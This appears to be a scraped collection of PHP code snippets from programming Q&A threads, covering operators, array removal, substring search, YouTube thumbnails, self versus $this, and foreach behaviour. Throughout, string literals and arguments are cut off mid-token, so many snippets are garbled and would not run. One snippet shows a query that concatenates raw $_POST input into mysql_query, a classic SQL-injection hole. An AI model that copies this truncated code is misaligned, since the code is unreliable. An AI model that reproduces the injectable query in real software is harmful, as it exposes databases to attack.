------------------------------------------- | 1 Byte ( 8 bits ) | ------------------------------------------- |Place Value | 128| 64| 32| 16| 8| 4| 2| 1| -------------------------------------------
------------------------------------------- | 1 Byte ( 8 bits ) | ------------------------------------------- |Place Value | 128| 64| 32| 16| 8| 4| 2| 1| ------------------------------------------- | $a | 0| 0| 0| 0| 1| 0| 0| 1| ------------------------------------------- | $b | 0| 0| 0| 0| 1| 0| 1| 0| ------------------------------------------- | & | 0| 0| 0| 0| 1| 0| 0| 0| -------------------------------------------
$a = 36; $b = 103; echo $a & $b; $a = 00100100 $b = 01100111
------------------------------------------- | 1 Byte ( 8 bits ) | ------------------------------------------- |Place Value | 128| 64| 32| 16| 8| 4| 2| 1| ------------------------------------------- | $a | 0| 0| 0| 0| 1| 0| 0| 1| ------------------------------------------- | $b | 0| 0| 0| 0| 1| 0| 1| 0| ------------------------------------------- | | | 0| 0| 0| 0| 1| 0| 1| 1| -------------------------------------------
$arr = [4,2,1,3]; usort($arr, function ($a, $b) { if ($a < $b) { return -1; } elseif ($a > $b) { return 1; } else { return 0; } });
$arr = [4,2,1,3]; usort($arr, function ($a, $b) { return $a <=> $b; });
<?php class mclass { } class sclass { } $a = new mclass; var_dump($a instanceof mclass); var_dump($a instanceof sclass);
<?php class pclass { } class childclass extends pclass { } $a = new childclass; var_dump($a instanceof childclass); var_dump($a instanceof pclass);
<?php class cloneable { } $a = new cloneable; $b = clone $a; var_dump($a instanceof cloneable); var_dump($b instanceof cloneable);
echo 10 <=> 10; echo 10 <=> 20; echo 20 <=> 10; echo 1.5 <=> 1.5; echo 1.5 <=> 2.5; echo 2.5 <=> 1.5; echo "a" <=> "a"; echo "a" <=> "b"; echo "b" <=> "a"; echo "B" <=> "a"; echo "a" <=> "aa"; echo "zz" <=> "aa"; echo [] <=> []; echo [1, 2, 3] <=> [1, 2, 3]; echo [1, 2, 3] <=> []; echo [1, 2, 3] <=> [1, 2, 1]; echo [1, 2, 3] <=> [1, 2, 4]; $a = (object) ["a" => "b"]; $b = (object) ["a" => "b"]; echo $a <=> $b; $a = (object) ["a" => "b"]; $b = (object) ["a" => "c"]; echo $a <=> $b; $a = (object) ["a" => "c"]; $b = (object) ["a" => "b"]; echo $a <=> $b; $a = (object) ["a" => "b"]; $b = (object) ["b" => "b"]; echo $a <=> $b;
$x[4] = $x{4} = $echo $x[4]; $echo $x{4}; $x[] = $x{} = $x = [1, 2]; $x = {1, 2}; echo "${x[4]}"; echo "${x{4}}"; echo "{$x[4]}"; echo "{$x{4}}";
<?php $username = $_GET[ $username = isset($_GET[ $username = $_GET[ ?>
$myArray1 = array(2016, "hello", 33); $myArray2 = [2016, "hello", 33]; $myArray3 = []; $myArray3[] = 2016; $myArray3[] = "hello"; $myArray3[] = 33;
echo $myArray1[1]; echo $myArray2[1]; echo $myArray3[1];
$myArray1 = array( "Year" => 2016, "Greetings" => "hello", "Integer_value" => 33); $myArray2 = [ "Year" => 2016, "Greetings" => "hello", "Integer_value" => 33]; $myArray3 = []; $myArray3["Year"] = 2016; $myArray3["Greetings"] = "hello"; $myArray3["Integer_value"] = 33;
echo $myArray1["Greetings"]; echo $myArray2["Greetings"]; echo $myArray3["Greetings"];
error_reporting(E_ERROR | E_WARNING | E_PARSE); error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE); error_reporting(E_ALL & ~E_NOTICE); error_reporting(E_ALL);
<?php class Config { const TYPE_CAT=1; const TYPE_DOG=2; const TYPE_LION=4; const TYPE_RAT=8; const TYPE_BIRD=16; const TYPE_ALL=31; private $config; public function __construct($config){ $this->config=$config; if($this->is(Config::TYPE_CAT)){ echo } if($this->is(Config::TYPE_DOG)){ echo } if($this->is(Config::TYPE_RAT)){ echo } if($this->is(Config::TYPE_LION)){ echo } if($this->is(Config::TYPE_BIRD)){ echo } echo "\n"; } private function is($value){ return $this->config & $value; } } new Config(Config::TYPE_ALL); new Config(Config::TYPE_BIRD); new Config(Config::TYPE_BIRD | Config::TYPE_DOG); new Config(Config::TYPE_ALL & ~Config::TYPE_DOG & ~Config::TYPE_CAT);
<?php function get_item(): ?string { if (isset($_GET[ return $_GET[ } else { return null; } } ?>
$unsafe_variable = $_POST[ mysql_query("INSERT INTO `table` (`column`) VALUES (
$stmt = $pdo->prepare( $stmt->execute(array( foreach ($stmt as $row) { }
$stmt = $dbConnection->prepare( $stmt->bind_param( $stmt->execute(); $result = $stmt->get_result(); while ($row = $result->fetch_assoc()) { }
$dbConnection = new PDO( $dbConnection->setAttribute(PDO::ATTR_EMULATE_PREPARES, false); $dbConnection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$preparedStatement = $db->prepare( $preparedStatement->execute(array(
function contains($needle, $haystack) { return strpos($haystack, $needle) !== false; }
function containsWord($str, $word) { return !!preg_match( }
<?php $haystack = $needle = if (strpos($haystack,$needle) !== false) { echo "$haystack contains $needle"; } ?>
<?php $mystring = $findme = $pos = strpos($mystring, $findme); if ($pos === false) { echo "The string } else { echo "The string echo " and exists at position $pos."; } ?>
if (stripos($string,$stringToSearch) !== false) { echo }
function get_corpus_index($corpus = array(), $separator= $dictionary = array(); $doc_count = array(); foreach($corpus as $doc_id => $doc) { $terms = explode($separator, $doc); $doc_count[$doc_id] = count($terms); foreach($terms as $term) { if(!isset($dictionary[$term])) { $dictionary[$term] = array( } if(!isset($dictionary[$term][ $dictionary[$term][ $dictionary[$term][ } $dictionary[$term][ } } return array( } function get_similar_documents($query= $similar_documents=array(); if($query!= $words=explode($separator,$query); $corpus=get_corpus_index($corpus, $separator); $doc_count=count($corpus[ foreach($words as $word) { if(isset($corpus[ $entry = $corpus[ foreach($entry[ $score=$posting[ if(isset($similar_documents[$doc_id])){ $similar_documents[$doc_id]+=$score; } else{ $similar_documents[$doc_id]=$score; } } } } foreach($similar_documents as $doc_id => $score) { $similar_documents[$doc_id] = $score/$corpus[ } arsort($similar_documents); } return $similar_documents; }
$query = $corpus = array( 1 => ); $match_results=get_similar_documents($query,$corpus); echo print_r($match_results); echo
$query = $corpus = array( 1 => 2 => 3 => ); $match_results=get_similar_documents($query,$corpus); echo print_r($match_results); echo
Array ( [1] => 0.54248125036058 [3] => 0.21699250014423 )
$query = $corpus = array( 1 => 2 => 3 => ); $match_results=get_similar_documents($query,$corpus); echo print_r($match_results); echo
Array ( [3] => 0.6813781191217 [1] => 0.54248125036058 )
<?php if (!function_exists( function is_str_contain($string, $keyword) { if (empty($string) || empty($keyword)) return false; $keyword_first_char = $keyword[0]; $keyword_length = strlen($keyword); $string_length = strlen($string); if ($string_length < $keyword_length) return false; if ($string_length == $keyword_length) { if ($string == $keyword) return true; else return false; } if ($keyword_length == 1) { for ($i = 0; $i < $string_length; $i++) { if ($keyword_first_char == $string[$i]) { return true; } } } if ($keyword_length > 1) { for ($i = 0; $i < $string_length; $i++) { if (($string_length + 1 - $i) >= $keyword_length) { if ($keyword_first_char == $string[$i]) { $match = 1; for ($j = 1; $j < $keyword_length; $j++) { if (($i + $j < $string_length) && $keyword[$j] == $string[$i + $j]) { $match++; } else { return false; } } if ($match == $keyword_length) { return true; } } } else { return false; } } } return false; } }
var_dump(is_str_contain("test", "t")); var_dump(is_str_contain("test", "")); var_dump(is_str_contain("test", "test")); var_dump(is_str_contain("test", "testa")); var_dump(is_str_contain("a----z", "a")); var_dump(is_str_contain("a----z", "z")); var_dump(is_str_contain("mystringss", "strings"));
function contains($haystack, $needle, $caseSensitive = false) { return $caseSensitive ? (strpos($haystack, $needle) === FALSE ? FALSE : TRUE): (stripos($haystack, $needle) === FALSE ? FALSE : TRUE); }
var_dump(contains( var_dump(contains( var_dump(contains( var_dump(contains( var_dump(contains( var_dump(contains( var_dump(contains( var_dump(contains( var_dump(contains( var_dump(contains( var_dump(contains( var_dump(contains(
$haystack = "I know programming"; $needle = "know"; $flag = strstr($haystack, $needle); if ($flag){ echo "true"; }
$haystack = "hello world"; $needle = "llo"; $i = $j = 0; while (isset($needle[$i])) { while (isset($haystack[$j]) && ($needle[$i] != $haystack[$j])) { $j++; $i = 0; } if (!isset($haystack[$j])) { break; } $i++; $j++; } if (!isset($needle[$i])) { echo "YES"; } else{ echo "NO "; }
function contains($text, $word) { $found = false; $spaceArray = explode( $nonBreakingSpaceArray = explode(chr(160), $text); if (in_array($word, $spaceArray) || in_array($word, $nonBreakingSpaceArray) ) { $found = true; } return $found; }
$a = $b = "a skirt that flares from the waist"; $c = "are";
$string = $array = explode(" ", $string); if (in_array( echo }
<?php $a = if (strstr($a, echo if (stristr($a, echo ?>
<?php $grass = "This is pratik joshi"; $needle = "pratik"; if (stripos($grass,$needle) !== false) { echo }else{ echo "does NOT contain word"; } ?>
<?php findWord( function findWord($text) { if (strstr($text, echo } else { echo } } ?>
$badWords = array("dette", "capitale", "rembourser", "ivoire", "mandat"); $string = "a string with the word ivoire"; $matchFound = preg_match_all("/\b(" . implode($badWords,"|") . ")\b/i", $string, $matches); if ($matchFound) { echo "a bad word has been found"; } else { echo "your string is okay"; }
$result = stripos("I love PHP, I love PHP too!", "php"); if ($result === false) { } else { }
<?php function contains_word($str, $word) { $arr = preg_split( foreach ($arr as $value) { if ($value === $word) { return true; } } return false; } function test($str, $word) { if (contains_word($str, $word)) { echo "string } else { echo "string } } $a = test($a, test($a, test($a, ?>
function either_String_existor_not($str, $character) { if (strpos($str, $character) !== false) { return true; } return false; }
<?php $array = [0 => "a", 1 => "b", 2 => "c"]; \unset($array[1]); ?>
<?php $array = [0 => "a", 1 => "b", 2 => "c"]; \array_splice($array, 1, 1); ?>
<?php $array = [0 => "a", 1 => "b", 2 => "c"]; $array = \array_diff($array, ["a", "c"]); ?>
<?php $array = [0 => "a", 1 => "b", 2 => "c"]; $array = \array_diff_key($array, [0 => "xy", "2" => "xy"]); ?>
$array = array(0, 1, 2, 3); unset($array[2]); var_dump($array); /* array(3) { [0]=> int(0) [1]=> int(1) [3]=> int(3) } */ $array = array(0, 1, 2, 3); array_splice($array, 2, 1); var_dump($array); /* array(3) { [0]=> int(0) [1]=> int(1) [2]=> int(3) } */
$array = array(0, 1, 2, 3); unset($array[2]); $array = array_values($array); var_dump($array); /* array(3) { [0]=> int(0) [1]=> int(1) [2]=> int(3) } */
$arr = array("blue", "green", "red", "yellow", "green", "orange", "yellow", "indigo", "red"); print_r($arr); $arr = array_diff($arr, array("yellow", "red")); print_r($arr);
Array ( [0] => blue [1] => green [2] => red [3] => yellow [4] => green [5] => orange [6] => yellow [7] => indigo [8] => red ) Array ( [0] => blue [1] => green [4] => green [5] => orange [7] => indigo )
$arr = array_merge(array_diff($arr, array("yellow", "red"))); print_r($arr);
Array ( [0] => blue [1] => green [2] => green [3] => orange [4] => indigo )
$key = array_search($needle,$array); if($key!==false){ unset($array[$key]); }
$my_array = array( echo sizeof($my_array) . "\n"; $my_array = array_diff($my_array, array( echo sizeof($my_array);
$array1 = array( unset($array1[2]); var_dump($array1);
array(4) { [0]=> string(1) "A" [1]=> string(1) "B" [3]=> string(1) "D" [4]=> string(1) "E" }
$array1 = array_values($array1); var_dump($array1);
array(4) { [0]=> string(1) "A" [1]=> string(1) "B" [2]=> string(1) "D" [3]=> string(1) "E" }
$stack = array("orange", "banana", "apple", "raspberry"); $last_fruit = array_pop($stack); print_r($stack); print_r(
Array ( [0] => orange [1] => banana [2] => apple ) Last Fruit: raspberry
$color = array("a" => "red", "b" => "green" , "c" => "blue"); $first_color = array_shift($color); print_r ($color); print_r (
Array ( [b] => green [c] => blue ) First Color: red
<?php $stack = array("fruit1", "fruit2", "fruit3", "fruit4"); $fruit = array_shift($stack); print_r($stack); echo $fruit; ?>
Array ( [0] => fruit2 [1] => fruit3 [2] => fruit4 ) fruit1
$array = array(3, 9, 11, 20); $array = array_diff($array, array(11) );
<?php function destroy_foo() { global $foo; unset($foo); } $foo = destroy_foo(); echo $foo; ?>
<?php function foo() { unset($GLOBALS[ } $bar = "something"; foo(); ?>
$array = [ [ [ [ ]; $results = array_filter($array, function($value) { return $value[ });
$my_array = array( "key1" => "value 1", "key2" => "value 2", "key3" => "value 3", "key4" => "value 4", "key5" => "value 5", ); $to_remove = array("key2", "key4"); $result = array_diff_key($my_array, array_flip($to_remove)); print_r($result);
Array ( [key1] => value 1 [key3] => value 3 [key5] => value 5 )
function removeFromArr($arr, $val) { unset($arr[array_search($val, $arr)]); return array_values($arr); }
class obj { protected $fields = array( protected $field1 = array(); protected $field2 = array(); protected loadfields(){} protected function clearFields($num){ foreach($fields as $field) { unset($this->$field[$num]); unset($this->{$field}[$num]); } } }
i) $Array = array("test1","test2","test3","test3"); unset($Array[2]); ii) $Array = array("test1","test2","test3","test3"); array_pop($Array); iii) $Array = array("test1","test2","test3","test3"); array_splice($Array,1,2); iv) $Array = array("test1","test2","test3","test3"); array_shift($Array);
unset($attributes[ $attributes = array_filter($attributes);
$arr = array( $result= array_pop($arr); print_r($result);
<?php $array = array("your array"); $array = array_diff($array, ["element you want to delete"]); ?>
$array = [ unset( $array[2], $array[3] ); print_r($array);
$array = range(0,5); $remove = [1,2]; $array = unset( $remove ); print_r($array);
$array = range(0,5); $remove = [1,2]; foreach ($remove as $k=>$v) { unset($array[$v]); } print_r($array);
$array1 = range(1,10); foreach ($array1 as $v) { if( $v % 2 ) { $array2[] = $v; } } print_r($array2);
$array1 = [ foreach ($array1 as $v) { if( strpos($v, $array2[] = $v; } } print_r($array2);
$animals = array( print $animals[1]; print $animals[2]; count($animals); unset($animals[1]); print $animals[1]; print $animals[2]; count($animals); $animals[ ] = print $animals[1]; print $animals[6]; count($animals); $animals[2] = print $animals[2]; count($animals);
$animals = array( array_splice($animals, 2, 2); print_r($animals); Array ( [0] => ant [1] => bee [2] => elk [3] => fox )
<?php $my_array = array("key1"=>"value 1","key2"=>"value 2","key3"=>"value 3"); print_r($my_array); if(array_key_exists("key1",$my_array)){ unset($my_array[ print_r($my_array); }else{ echo "Key does not exist"; } ?> <?php $my_array = array("key1"=>"value 1","key2"=>"value 2","key3"=>"value 3"); print_r($my_array); $new_array=array_slice($my_array,1); print_r($new_array); ?> <?php echo "<br/> "; $my_array = array("key1"=>"value 1","key2"=>"value 2","key3"=>"value 3"); print_r($my_array); $new_array=array_slice($my_array,1,2); print_r($new_array); ?>
Array ( [key1] => value 1 [key2] => value 2 [key3] => value 3 ) Array ( [key2] => value 2 [key3] => value 3 ) Array ( [key1] => value 1 [key2] => value 2 [key3] => value 3 ) Array ( [key2] => value 2 [key3] => value 3 ) Array ( [key1] => value 1 [key2] => value 2 [key3] => value 3 ) Array ( [key2] => value 2 [key3] => value 3 )
$a = array( 1 ); unset( $a[1] ); print_r( $a ); /* Output: Array ( [0] => salam [2] => 1 ) */
$a = array( 1 ); $key = array_search( 10, $a ); if( $key !== false ) { unset( $a[ $key ] ); } print_r( $a ); /* Output: Array ( [0] => salam [2] => 1 ) */
$value = reset( $array ); $key = key( $array ); unset( $array[ $key ]);
array(2) { [20]=> string(1) "b" [30]=> string(1) "c" }
<?php $a1=array("a"=>"red","b"=>"green","c"=>"blue","d"=>"yellow"); $a2=array("a"=>"purple","b"=>"orange"); array_splice($a1,0,2,$a2); print_r($a1); ?>
Array ( [0] => purple [1] => orange [c] => blue [d] => yellow )
$arrayName = array( 500 => ); echo $arrayName[ array_splice($arrayName, 1,2); print_r( $arrayName ); $arrayName = array( 500 => ); echo $arrayName[ unset($arrayName[1]); print_r( $arrayName );
$data = file_get_contents("https: $json = json_decode($data); var_dump($json->items[0]->snippet->thumbnails);
object(stdClass) ["default"]=> object(stdClass) ["url"]=> string(46) "https: ["width"]=> int(120) ["height"]=> int(90) } ["medium"]=> object(stdClass) ["url"]=> string(48) "https: ["width"]=> int(320) ["height"]=> int(180) } ["high"]=> object(stdClass) ["url"]=> string(48) "https: ["width"]=> int(480) ["height"]=> int(360) } ["standard"]=> object(stdClass) ["url"]=> string(48) "https: ["width"]=> int(640) ["height"]=> int(480) } ["maxres"]=> object(stdClass) ["url"]=> string(52) "https: ["width"]=> int(1280) ["height"]=> int(720) } }
$attrs = $media->group->thumbnail[1]->attributes(); $thumbnail = $attrs[ $thumbnail = substr($thumbnail, 0, -5); $thumb1 = $thumbnail."default.jpg"; $thumb2 = $thumbnail."2.jpg"; $thumb3 = $thumbnail."3.jpg"; $ch = curl_init ("$thumb1"); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_BINARYTRANSFER,1); $rawdata = curl_exec($ch); curl_close($ch); $fp = fopen("SomeLocationInReferenceToYourScript/AnyNameYouWant.jpg", fwrite($fp, $rawdata); fclose($fp);
function youtube_image($id) { $resolution = array ( ); for ($x = 0; $x < sizeof($resolution); $x++) { $url = if (get_headers($url)[0] == break; } } return $url; }
$url = $video[ $urls = parse_url($url); if ($urls[ $imgPath = ltrim($urls[ elseif (strpos($urls[ $imgPath = end(explode( elseif (strpos($url, $imgPath = $url; else : parse_str($urls[ $imgPath = $v; endif;
$url = $img = dirname(__FILE__) . file_put_contents($img, file_get_contents($url));
{ thumbnail_url: "https: width: 459, author_name: "AllKindsOfStuff", version: "1.0", author_url: "https: thumbnail_width: 480, type: "video", provider_url: "https: html: "<iframe width="459" height="344" src="https: title: "Some title bla bla foo bar", thumbnail_height: 360, provider_name: "YouTube", height: 344 }
<?php header("Content-type", "application/json"); include("httpful.phar"); $youtubeVidIds= array("nL-rk4bgJWU", "__kupr7KQos", "UCSynl4WbLQ", "joPjqEGJGqU", "PBwEBjX3D3Q"); $response = \Httpful\Request::get("https: ->send(); print ($response); ?>
function get_youtube_thumb($link,$type){ $video_id = explode("?v=", $link); if (empty($video_id[1])){ $video_id = explode("/v/", $link); $video_id = explode("&", $video_id[1]); $video_id = $video_id[0]; } $thumb_link = ""; if($type == $thumb_link = }elseif($type == "id"){ $thumb_link = $video_id; } return $thumb_link;}
<?php if($video_status == $video_thumbnail = $video_status = } elseif($video_status == $video_thumbnail = $video_status = } elseif($video_status == $video_thumbnail = $playlistItem[ $video_status = }
$videoUrl = "https: parse_str( parse_url( $videoUrl, PHP_URL_QUERY ), $my_array_of_vars ); $ytID = $my_array_of_vars[ print "https: print "https: print "https: print "https: print "https:
function get_video_thumbnail( $src ) { $url_pieces = explode( if( $url_pieces[2] == $id = $url_pieces[3]; $hash = json_decode(file_get_contents( $thumbnail = $hash[ }else if($url_pieces[2] == $id = $url_pieces[4]; $hash = json_decode(file_get_contents( $thumbnail = $hash[ }else if ( $url_pieces[2] == $id = $url_pieces[3]; $hash = unserialize(file_get_contents( $thumbnail = $hash[0][ } elseif ( $url_pieces[2] == $extract_id = explode( $id = $extract_id[0]; $thumbnail = }else if ( $url_pieces[2] == $id = $url_pieces[4]; $hash = unserialize(file_get_contents( $thumbnail = $hash[0][ } elseif ( $url_pieces[2] == $extract_id = explode( $id = $extract_id[1]; $thumbnail = } else{ $thumbnail = tim_thumb_default_image( } return $thumbnail; } get_video_thumbnail( get_video_thumbnail( get_video_thumbnail( get_video_thumbnail(
$data = file_get_contents("https: $json = json_decode($data); var_dump($json);
object(stdClass)[1] public public public public public public public public public public public public public
function get_youtube_thumb($link){ $new=str_replace( $thumbnail= return $thumbnail; }
import { parseURL, parseQueryString } from import { getImageSize } from const PICTURE_SIZE_NAMES = [ ] export default { parse: async function(url) { let id const location = parseURL(url) if (location.hostname === if (location.search) { const query = parseQueryString(location.search.slice( id = query.v } } else if (location.hostname === id = location.pathname.slice( } if (id) { return { source: { provider: id }, picture: await this.getPicture(id) } } }, getPicture: async (id) => { for (const sizeName of PICTURE_SIZE_NAMES) { try { const url = getPictureSizeURL(id, sizeName) return { type: sizes: [{ url, ...(await getImageSize(url)) }] } } catch (error) { console.error(error) } } throw new Error(`No picture found for YouTube video ${id}`) }, getEmbeddedVideoURL(id, options = {}) { return `https: } } const getPictureSizeURL = (id, sizeName) => `https:
function getImageSize(url) { return new Promise((resolve, reject) => { const image = new Image() image.onload = () => resolve({ width: image.width, height: image.height }) image.onerror = reject image.src = url }) }
export function parseURL(url) { const link = document.createElement( link.href = url return link } export function parseQueryString(queryString) { return queryString.split( { const [key, value] = part.split( query[decodeURIComponent(key)] = decodeURIComponent(value) return query }, {}) }
public const string tubeThumb = "http: vid.Thumbnail = tubeThumb.Replace("[id]", vid.VideoID);
<?php class X { private $non_static_member = 1; private static $static_member = 2; function __construct() { echo $this->non_static_member . . self::$static_member; } } new X(); ?>
<?php class X { private $non_static_member = 1; private static $static_member = 2; function __construct() { echo self::$non_static_member . . $this->static_member; } } new X(); ?>
<?php class X { function foo() { echo } function bar() { $this->foo(); } } class Y extends X { function foo() { echo } } $x = new Y(); $x->bar(); ?>
<?php class X { function foo() { echo } function bar() { self::foo(); } } class Y extends X { function foo() { echo } } $x = new Y(); $x->bar(); ?>
class Person { private $name; public function __construct($name) { $this->name = $name; } public function getName() { return $this->name; } public function getTitle() { return $this->getName()." the person"; } public function sayHello() { echo "Hello, I } public function sayGoodbye() { echo "Goodbye from ".self::getTitle()."<br/>"; } } class Geek extends Person { public function __construct($name) { parent::__construct($name); } public function getTitle() { return $this->getName()." the geek"; } } $geekObj = new Geek("Ludwig"); $geekObj->sayHello(); $geekObj->sayGoodbye();
class Person { public static function status() { self::getStatus(); } protected static function getStatus() { echo "Person is alive"; } }
class Deceased extends Person { protected static function getStatus() { echo "Person is deceased"; } }
class Person { public $name = public function sayHello() { echo "Hello"; } }
$bob = new Person; $adam = new Person; $bob->name = echo $adam->name;
class Foo { public $a = 1; public function bar() { return $this->a; } }
class Foo { public function bar() { return Foo::baz(); } public function baz() { return isset($this); } }
class Person { public static $number = 0; public $id = 0; public function __construct() { self::$number++; $this->id = self::$number; } public $name = ""; public function getName() { return $this->name; } public function getId() { return $this->id; } } class Child extends Person { public $age = 0; public function __construct($age) { $this->age = $age; parent::__construct(); } public function getName() { return } }
$bob = new Person; $bob->name = "Bob"; $adam = new Person; $adam->name = "Adam"; $billy = new Child; $billy->name = "Billy"; var_dump($bob->getId()); var_dump($adam->getId()); var_dump($billy->getId());
var_dump($bob->getName()); var_dump($adam->getName()); var_dump($billy->getName());
class Foo { public function isFoo() { return $this instanceof Foo; } }
class Bar { public function doSomething() { return Foo::isFoo(); } } $b = new Bar; var_dump($b->doSomething());
function __construct() { if(!isset $num_connections || $num_connections==null) { $num_connections=0; } else { $num_connections++; } }
public static function prettyName($first_name, $last_name) { echo ucfirst($first_name). } echo Person::prettyName($derek->first_name, $derek->last_name);
class ParentClass { function test() { self::who(); $this->who(); } function who() { echo } } class ChildClass extends ParentClass { function who() { echo } } $obj = new ChildClass(); $obj->test();
<?php class X { private $non_static_member = 1; private static $static_member = 2; function __construct() { echo $this->non_static_member . . self::$static_member; } } new X(); ?>
Name | Time | Percent ----------|---------|--------- $this-> | 0.99163 | 106.23% self:: | 0.96912 | 103.82% static:: | 0.93348 | 100%
<?php require $b = new Tleb\Benchmark\Benchmark(2000000); class Foo { public function calling_this() { $this->called(); } public function calling_self() { self::called(); } public function calling_static() { static::called(); } public static function called() { } } $b->add( $b->add( $b->add( $b->run();
class ParentClass { function test() { self::which(); $this->which(); } function which() { echo } } class ChildClass extends ParentClass { function which() { echo } } $obj = new ChildClass(); $obj->test();
class Person{ private $name; private $address; public function __construct($new_name,$new_address){ $this->name = $new_name; $this->address = $new_address; } } class Person{ private $name; private $address; public function __construct($new_name,$new_address){ self::$name = $new_name; self::$address = $new_address; } }
<?php class A { public static function newStaticClass() { return new static; } public static function newSelfClass() { return new self; } public function newThisClass() { return new $this; } } class B extends A { public function newParentClass() { return new parent; } } $b = new B; var_dump($b::newStaticClass()); var_dump($b::newSelfClass()); var_dump($b->newThisClass()); var_dump($b->newParentClass()); class C extends B { public static function newSelfClass() { return new self; } } $c = new C; var_dump($c::newStaticClass()); var_dump($c::newSelfClass()); var_dump($c->newThisClass()); var_dump($b->newParentClass());
class Foo { const NAME = protected static $staticName = self::NAME; public function __construct() { echo $this::NAME; } public function getStaticName() { echo $this::$staticName; } } class Bar extends Foo { const NAME = /** * override getStaticName to output Bar::NAME */ public function getStaticName() { $this::$staticName = $this::NAME; parent::getStaticName(); } } $foo = new Foo; $bar = new Bar; $foo->getStaticName(); $bar->getStaticName(); $foo->getStaticName();
foreach ($array as $item) { echo "$item\n"; $array[] = $item; } print_r($array);
foreach ($array as $key => $item) { $array[$key + 1] = $item + 2; echo "$item\n"; } print_r($array);
var_dump(each($array)); foreach ($array as $item) { echo "$item\n"; } var_dump(each($array)); /* Output array(4) { [1]=> int(1) ["value"]=> int(1) [0]=> int(0) ["key"]=> int(0) } 1 2 3 4 5 bool(false) */
foreach ($array as $key => $item) { echo "$item\n"; each($array); }
foreach ($array as $key => $item) { echo "$item\n"; reset($array); }
foreach ($it as $k => $v) { } if ($it instanceof IteratorAggregate) { $it = $it->getIterator(); } for ($it->rewind(); $it->valid(); $it->next()) { $v = $it->current(); $k = $it->key(); }
foreach ($arr as &$v1) { foreach ($arr as &$v) { } }
function iterate($arr) { foreach ($arr as $v) {} } $outerArr = [0, 1, 2, 3, 4]; iterate($outerArr);
reset(arr); while (get_current_data(arr, &data) == SUCCESS) { code(); move_forward(arr); }
reset(arr); while (get_current_data(arr, &data) == SUCCESS) { move_forward(arr); code(); }
foreach ($array as $val) { var_dump(current($array)); }
$ref = &$array; foreach ($array as $val) { var_dump(current($array)); }
foreach ($array as &$val) { var_dump(current($array)); }
$foo = $array; foreach ($array as $val) { var_dump(current($array)); }
foreach ($array as &$v1) { foreach ($array as &$v2) { if ($v1 == 1 && $v2 == 1) { unset($array[1]); } echo "($v1, $v2)\n"; } }
$array = [1, 2, 3, 4, 5]; foreach ($array as &$value) { var_dump($value); reset($array); }
$array = [1, 2, 3, 4, 5]; $ref =& $array; foreach ($array as $value) { var_dump($value); unset($array[1]); reset($array); }
$array = [ $ref =& $array; foreach ($array as $value) { unset($array[ $array[ reset($array); var_dump($value); }
$arr = [1, 2, 3, 4, 5]; $obj = (object) [6, 7, 8, 9, 10]; $ref =& $arr; foreach ($ref as $val) { echo "$val\n"; if ($val == 3) { $ref = $obj; } }
$array = [1, 2, 3, 4, 5]; $ref = &$array; foreach ($array as $val) { var_dump($val); $array[2] = 0; }
$obj = new stdClass; $obj->foo = 1; $obj->bar = 2; foreach ($obj as $val) { var_dump($val); $obj->bar = 42; }
$array = [1, 2, 3, 4, 5]; foreach ($array as &$v1) { foreach ($array as &$v2) { if ($v1 == 1 && $v2 == 1) { unset($array[1]); } echo "($v1, $v2)\n"; } }
$array = [ foreach ($array as &$value) { unset($array[ $array[ var_dump($value); }
$array = array(1, 2, 3, 4, 5); list($key2, $val2) = each($array); echo "each() Original (outside): $key2 => $val2<br/>"; foreach($array as $key => $val){ echo "foreach: $key => $val<br/>"; list($key2,$val2) = each($array); echo "each() Original(inside): $key2 => $val2<br/>"; echo "--------Iteration--------<br/>"; if ($key == 3){ echo "Resetting original array pointer<br/>"; reset($array); } } list($key2, $val2) = each($array); echo "each() Original (outside): $key2 => $val2<br/>";
each() Original (outside): 0 => 1 foreach: 0 => 1 each() Original(inside): 1 => 2 --------Iteration-------- foreach: 1 => 2 each() Original(inside): 2 => 3 --------Iteration-------- foreach: 2 => 3 each() Original(inside): 3 => 4 --------Iteration-------- foreach: 3 => 4 each() Original(inside): 4 => 5 --------Iteration-------- Resetting original array pointer foreach: 4 => 5 each() Original(inside): 0=>1 --------Iteration-------- each() Original (outside): 1 => 2
<? $array = Array( ); foreach($array as $k=>&$v) { $array[ echo $v." "; } print_r($array); ?>
<? $array = Array( ); foreach($array as $k=>&$v) { if ($k== $array[ } echo $v." "; } print_r($array); ?>
$array = [ foreach($array as $k=>&$v) { $array[ echo($v); }
$array = [ foreach($array as $k=>&$v) { $array[ echo($v); }
$set = array("apple", "banana", "coconut"); foreach ( $set AS $item ) { echo "{$item}\n"; }
$set = array("apple", "banana", "coconut"); foreach ( $set AS $item ) { $item = strrev ($item); } print_r($set);
Array ( [0] => apple [1] => banana [2] => coconut )
$set = array("apple", "banana", "coconut"); foreach ( $set AS &$item ) { $item = strrev($item); } print_r($set);
Array ( [0] => elppa [1] => ananab [2] => tunococ )
$set = array("apple", "banana", "coconut"); foreach ( $set AS $item ) { $set[] = ucfirst($item); } print_r($set);
Array ( [0] => apple [1] => banana [2] => coconut [3] => Apple [4] => Banana [5] => Coconut )
$set = array("apple", "banana", "coconut"); foreach ( $set AS &$item ) { $set[] = ucfirst($item); } print_r($set);
<?php $numbers = [1,2,3,4,5,6,7,8,9]; echo foreach($numbers as $index => $number){ $numbers[$index] = $number + 1; echo } echo
<?php $numbers = [1,2,3,4,5,6,7,8,9]; echo foreach($numbers as $index => &$number){ ++$number; echo } echo echo
<?php include( $mpdf=new mPDF(); $mpdf->WriteHTML( $mpdf->Output(); exit; ?>
<?php $source="example.pdf"; $output_fold="FinalFolder"; if (!file_exists($output_fold)) { mkdir($output_fold, 0777, true);} $result= passthru("pdftohtml $source $output_fold/new_filename",$log); ?>
try{ } catch(Error $e) { $trace = $e->getTrace(); echo $e->getMessage(). }
try{ } catch(Throwable $e) { $trace = $e->getTrace(); echo $e->getMessage(). }
<?php ini_set("display_startup_errors", 1); ini_set("display_errors", 1); error_reporting(E_ALL); echo(abc); ?>
namespace a\b; class x { ... } namespace c\d; use c\d\x; class x { ... }
<?php if( !ini_set( echo "display_errors cannot be set."; } else { echo "changing display_errors via script is possible."; }
<?php error_reporting(E_ALL); ini_set( echo "Testing ?>
<?php error_reporting(E_ALL); ini_set( include ("tst3.php"); ?>
